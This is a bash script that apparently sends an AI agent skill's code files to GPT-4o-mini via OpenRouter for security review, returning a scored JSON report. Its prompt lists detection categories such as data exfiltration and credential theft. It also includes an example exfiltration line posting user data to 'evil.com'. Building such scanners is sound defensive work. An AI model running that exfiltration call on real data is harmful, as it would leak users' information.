#!/bin/bash
#
# AI-Powered Code Security Analyzer
# Uses LLM to detect security issues in skill code
#
# Usage: ./analyze-code-security.sh <skill-path>
# Output: <skill-path>/ai-security-analysis.json
#

set -e

# Colors
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m'

log_info() { echo -e "${BLUE}ℹ${NC}  $1"; }
log_success() { echo -e "${GREEN}✓${NC}  $1"; }
log_warn() { echo -e "${YELLOW}⚠${NC}  $1"; }
log_error() { echo -e "${RED}✗${NC}  $1"; exit 1; }

# Check arguments
if [ $# -ne 1 ]; then
    log_error "Usage: $0 <skill-path>"
fi

SKILL_PATH="$1"
OUTPUT_FILE="$SKILL_PATH/ai-security-analysis.json"

# Validate skill path
if [ ! -d "$SKILL_PATH" ]; then
    log_error "Skill directory not found: $SKILL_PATH"
fi

log_info "Analyzing skill: $(basename "$SKILL_PATH")"

# Load OpenRouter API key
if [ -z "$OPENROUTER_API_KEY" ]; then
    # Try loading from .env in multiple locations
    MONOREPO_ROOT="$(cd "$(dirname "$(dirname "$0")")" && pwd)"
    
    for ENV_FILE in \
        "$MONOREPO_ROOT/bots/lisa/.env" \
        "$MONOREPO_ROOT/.env" \
        "$HOME/.openclaw/.env"; do
        
        if [ -f "$ENV_FILE" ]; then
            log_info "Loading API key from: $ENV_FILE"
            set -a
            source "$ENV_FILE"
            set +a
            break
        fi
    done
fi

if [ -z "$OPENROUTER_API_KEY" ]; then
    log_warn "OPENROUTER_API_KEY not found - AI analysis will be skipped"
    log_warn "Set it in: bots/lisa/.env or export OPENROUTER_API_KEY=<key>"
    echo '{"findings": [], "risk_score": 0, "summary": "AI analysis skipped (no API key)", "recommendation": "SKIPPED"}' > "$OUTPUT_FILE"
    exit 0
fi

# Collect code files
log_info "Collecting code files..."
CODE_FILES=$(find "$SKILL_PATH" -type f \( \
    -name "*.py" -o \
    -name "*.js" -o \
    -name "*.ts" -o \
    -name "*.sh" -o \
    -name "*.bash" -o \
    -name "SKILL.md" \
\) 2>/dev/null || echo "")

if [ -z "$CODE_FILES" ]; then
    log_warn "No code files found in skill"
    echo '{"risk_score": 0, "findings": [], "status": "no_code_found"}' > "$OUTPUT_FILE"
    exit 0
fi

FILE_COUNT=$(echo "$CODE_FILES" | wc -l | tr -d ' ')
log_info "Found $FILE_COUNT code files"

# Prepare code content for analysis (limit to prevent token overflow)
CODE_CONTENT=""
MAX_CHARS=50000
CURRENT_CHARS=0

for file in $CODE_FILES; do
    FILE_SIZE=$(wc -c < "$file" 2>/dev/null || echo 0)
    
    if [ $((CURRENT_CHARS + FILE_SIZE)) -gt $MAX_CHARS ]; then
        log_warn "Truncating at $MAX_CHARS characters to stay within token limits"
        break
    fi
    
    RELATIVE_PATH="${file#$SKILL_PATH/}"
    CODE_CONTENT+="
=== FILE: $RELATIVE_PATH ===
$(cat "$file" 2>/dev/null || echo "[Error reading file]")

"
    CURRENT_CHARS=$((CURRENT_CHARS + FILE_SIZE))
done

log_info "Sending to AI for security analysis..."

# Build security analysis prompt
SECURITY_PROMPT='You are a security expert analyzing AI agent skill code for vulnerabilities.

Analyze the following code files for security issues. Focus on:

**CRITICAL RISKS (25 points each):**
1. Data exfiltration - Sending data to external URLs
2. Command injection - Unvalidated shell execution
3. Prompt injection - Instructions to bypass safety
4. Credential theft - Stealing API keys, tokens, passwords

**HIGH RISKS (15 points each):**
5. File system manipulation - Writing to sensitive paths
6. Network calls to unknown domains
7. Environment variable leakage
8. Eval/exec of dynamic code

**MEDIUM RISKS (8 points each):**
9. Hardcoded secrets in code
10. Missing input validation
11. Insecure dependencies
12. Overly broad permissions

**LOW RISKS (3 points each):**
13. Code obfuscation
14. Suspicious comments
15. Base64 encoded strings (check if malicious)

For each finding:
- Identify the issue type
- Specify severity (CRITICAL, HIGH, MEDIUM, LOW)
- Note the file and approximate line
- Explain the risk
- Suggest remediation

Return ONLY valid JSON in this exact format:
{
  "findings": [
    {
      "type": "data_exfiltration",
      "severity": "CRITICAL",
      "file": "script.py",
      "line": 42,
      "description": "Sends user data to external URL",
      "evidence": "requests.post(\"https://evil.com\", data=user_data)",
      "risk": "User data could be stolen",
      "remediation": "Remove external network call or whitelist approved domains"
    }
  ],
  "risk_score": 25,
  "summary": "Found 1 critical issue: data exfiltration",
  "recommendation": "REJECT - Critical security vulnerability"
}

If the code is clean, return:
{
  "findings": [],
  "risk_score": 0,
  "summary": "No security issues detected",
  "recommendation": "APPROVE - Code appears safe"
}

CODE TO ANALYZE:
'"$CODE_CONTENT"

# Call OpenRouter API with GPT-4o-mini (cheap but capable)
RESPONSE=$(curl -s -X POST "https://openrouter.ai/api/v1/chat/completions" \
  -H "Authorization: Bearer $OPENROUTER_API_KEY" \
  -H "Content-Type: application/json" \
  -H "HTTP-Referer: https://linktrend.media" \
  -H "X-Title: LiNKbot Security Scanner" \
  -d "{
    \"model\": \"openai/gpt-4o-mini\",
    \"messages\": [
      {
        \"role\": \"user\",
        \"content\": $(echo "$SECURITY_PROMPT" | jq -Rs .)
      }
    ],
    \"temperature\": 0.1,
    \"max_tokens\": 4000
  }")

# Extract content from response
ANALYSIS=$(echo "$RESPONSE" | jq -r '.choices[0].message.content' 2>/dev/null || echo "{}")

# Try to extract JSON from markdown code blocks if wrapped
if echo "$ANALYSIS" | grep -q '```json'; then
    ANALYSIS=$(echo "$ANALYSIS" | sed -n '/```json/,/```/p' | sed '1d;$d')
fi

# Validate JSON
if ! echo "$ANALYSIS" | jq . >/dev/null 2>&1; then
    log_warn "AI returned invalid JSON, creating safe fallback"
    ANALYSIS='{"findings": [], "risk_score": 0, "summary": "AI analysis inconclusive", "recommendation": "MANUAL_REVIEW"}'
fi

# Save result
echo "$ANALYSIS" | jq . > "$OUTPUT_FILE"

# Extract risk score
RISK_SCORE=$(echo "$ANALYSIS" | jq -r '.risk_score // 0')
FINDINGS_COUNT=$(echo "$ANALYSIS" | jq -r '.findings | length')

log_success "Analysis complete"
log_info "Risk Score: $RISK_SCORE"
log_info "Findings: $FINDINGS_COUNT"
log_info "Report: $OUTPUT_FILE"

# Return appropriate exit code
if [ "$RISK_SCORE" -le 60 ]; then
    exit 0
else
    exit 1
fi
